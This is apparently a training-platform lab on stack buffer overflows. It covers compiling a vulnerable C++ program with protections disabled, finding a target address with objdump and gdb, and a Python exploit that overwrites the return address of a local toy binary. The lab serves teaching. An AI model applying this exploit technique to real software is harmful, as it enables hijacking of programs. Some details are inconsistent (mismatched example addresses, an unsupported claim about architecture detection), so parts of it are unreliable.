# CyberLabs: Stack Buffer Overflow Control Flow Laboratory

**Module Code:** CL-MEM-002

**Level:** Intermediate / Advanced

**Topic:** Memory Corruption Vulnerabilities

## Laboratory Purpose

This laboratory, prepared for the CyberLabs education platform, addresses the classic **Stack Buffer Overflow** vulnerability and how this vulnerability can be used to take control of program flow. Participants are expected to gain the following competencies by the end of this laboratory:

  * Understanding how Stack Buffer Overflow vulnerability affects the program's return address.
  * Compiling programs with flags that facilitate exploit development (`-fno-stack-protector`, `-z execstack`, `-no-pie`) using the `g++` compiler.
  * Performing static analysis on a program using `objdump` to identify function addresses.
  * Performing dynamic analysis using `gdb` (GNU Debugger), crashing the program, and analyzing stack state.
  * Using commands like `x/32gx $rbp` within GDB to directly examine data on the stack and verify the offset value needed for exploitation.

## Disclaimer / Legal Warning

The information provided in this blog post is intended for educational and informational purposes only. It is not intended to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

The information provided in this blog post is for educational and informational purposes only. It does not intend to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

This laboratory content is designed entirely for the **CyberLabs educational environment**. The purpose of the information and codes here is to help cybersecurity experts better understand defense mechanisms and develop vulnerability analysis capabilities. The use of these materials outside the CyberLabs environment or for illegal purposes is strictly prohibited, and all responsibility belongs to the user.

## Difficulty Levels

## 🟢 **EASY WAY: With Debug Symbols**
```bash
# Add -g flag in test_lab.sh file
g++ -m64 -fno-stack-protector -z execstack -no-pie -g -o vulnerable_code vulnerable_code.cpp
```
- Easier analysis with debug symbols
- `p &variable` commands work in GDB
- Ideal for educational purposes

## 🔴 **HARD WAY: Without Debug Symbols (Default)**
```bash
# Current compilation (no debug symbols)
g++ -m64 -fno-stack-protector -z execstack -no-pie -o vulnerable_code vulnerable_code.cpp
```
- Closer to real world
- Requires `info functions`, `disassemble` commands
- Production binaries don't have debug symbols

## Installation and Execution Steps

### 1. Compiling the Vulnerable Code

The first step is to compile the C++ source code using specific flags. These flags disable some protection mechanisms in modern operating systems, making exploitation more predictable.

```bash
g++ -m64 -fno-stack-protector -z execstack -no-pie -o vulnerable_code vulnerable_code.cpp
```

  * `-m64`: Compiles the program as 64-bit.
  * `-fno-stack-protector`: Disables "canary" values used to detect stack overflows.
  * `-z execstack`: Marks the stack region as executable. This is necessary for scenarios where shellcode is injected into the stack and executed.
  * `-no-pie`: Disables Position Independent Executable (PIE) feature. This keeps program and function addresses constant on each run.

### 2. Static Analysis: Finding Target Function Address

Our goal is to redirect the program's flow to a function that would not normally be called (e.g., `target_function`). For this, we need to find the memory address of this function using the `objdump` tool.

```bash
objdump -d ./vulnerable_code | grep target_function
```

This command will give you the starting address of `target_function`. For example:
`0000000000401186 <target_function>:`
In this case, our target address will be `0x401186`.

### 3. Dynamic Analysis: Triggering the Vulnerability with GDB

Now we will examine the existence and impact of the vulnerability live using GDB (GNU Debugger).

```bash
gdb vulnerable_code
```

After the GDB environment opens, run the program with special input that will overflow the buffer. The `A` character (HEX `0x41`) is frequently used for padding purposes as it is easily recognizable in memory. Let's send a 72-byte sequence of 'A'.

```
(gdb) run <<< $(python -c 'print("A"*72)')
```

The program will crash with a "Segmentation fault" error because the return address is overwritten with an invalid address like `0x4141414141414141`. This shows we are very close to taking control.

### 4. Examining the Stack: `x/32gx $rbp`

Examining the state of the stack at the moment of crash is the most critical step for writing exploitation code. The `x/32gx $rbp` command allows us to examine memory starting from where the stack pointer (`$rbp`) points at the moment of crash.

  * `x`: e**x**amine command.
  * `/32gx`: Show 32 **g**iant word (64-bit) data in he**x** format.

```
(gdb) x/32gx $rbp
```

The output of this command will be similar to:

```
0x7fffffffe318: 0x4141414141414141      0x00007ffff7a2d830
0x7fffffffe328: 0x00000000004011e9      0x0000000100000000
...
```

**How do we interpret this output?**

  * `0x7fffffffe318:`: Memory address on the stack.
  * `0x4141414141414141`: This is exactly where the return address should be. The last 8 bytes of our 72-byte 'A' input have landed here. This confirms that we need **72 bytes of padding** to control the return address.

### 5. Developing and Running the Exploit

Now we have all the information:

1.  **Required Padding Size:** 72 bytes.
2.  **Target Address:** The address we found with `objdump` (e.g., `0x401186`).

Using this information, we can write our exploit. Our payload will be `[ 72 byte 'A' ] + [ 8 byte Target Address ]`.

```python
# exploit_final.py
import struct
import subprocess
import sys

# Name of the compiled vulnerable program
VICTIM_PROGRAM = "./vulnerable_code"

# --- FIND THIS ADDRESS WITH GDB ON YOUR OWN SYSTEM ---
# Example: 0x4011e9
TARGET_ADDRESS = 0x401146  # <-- UPDATE THIS LINE WITH THE ADDRESS YOU GOT FROM GDB

# Calculated padding size for 64-bit architecture
# [64 byte buffer] + [8 byte saved RBP] = 72 bytes
PADDING_SIZE = 72

def main():
    """
    Main function that initiates the exploitation process.
    """
    print("--- [ATTACKER] Stack Overflow Exploit Started ---")
    
    if TARGET_ADDRESS == 0x4011e9:
        print("\n[!] WARNING: Don't forget to update TARGET_ADDRESS with your system's address!\n")

    print(f"[*] Target Address: {hex(TARGET_ADDRESS)}")
    print(f"[*] Padding Size: {PADDING_SIZE}")
    
    # Create payload: [ 72 byte padding ('A') ] + [ 8 byte target address ]
    padding = b'A' * PADDING_SIZE
    
    # Pack address in 64-bit (8 byte) little-endian format
    overwrite_address = struct.pack("<Q", TARGET_ADDRESS)
    
    payload = padding + overwrite_address
    
    print(f"[*] Payload created as {len(payload)} bytes.")
    
    try:
        # Start the vulnerable program as a subprocess.
        # We connect pipes to write to stdin and read from stdout/stderr.
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
    except FileNotFoundError:
        print(f"\n[!] ERROR: '{VICTIM_PROGRAM}' not found. Did you compile the C++ code?")
        sys.exit(1)
        
    print("[*] Sending payload to victim program...")
    
    # Send payload to program's standard input and get output
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    # Convert output from bytes to string for easier processing
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    
    print("\n--- Output from Victim Program ---")
    print(stdout_output)
    print("------------------------------------")
    
    # Look for the keyword we determined in the program's output.
    if "CONTROL TAKEN" in stdout_output:
        print("\n[+] Vulnerability successfully exploited!")
    else:
        print("\n[-] Exploitation failed. Check the address or offset.")
        # We can also print stderr for debugging
        stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')
        if stderr_output:
            print("\n--- Error Output (stderr) ---")
            print(stderr_output)


if __name__ == "__main__":
    main()

```

When you run the exploit, you should see the success message defined in the `target_function` in the program's output. This means you have successfully taken control of the program's flow.

## Linux Compatibility

This lab is designed to work on both Linux and macOS systems:

### Compilation for Linux
```bash
# Special compilation script for Linux
./compile_linux.sh

# Or manual compilation
g++ -m64 -fno-stack-protector -z execstack -no-pie -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```

### Requirements
- **Linux:** `g++`, `build-essential`, `libc6-dev`
- **macOS:** `g++` (Xcode Command Line Tools)
- **Python:** `python3`, `pwntools`

### Testing
```bash
# Run all tests
./test_lab.sh

# Run exploit
python3 source_code/exploit.py
```

The exploit automatically detects system architecture (32-bit/64-bit) and uses the appropriate packing function.
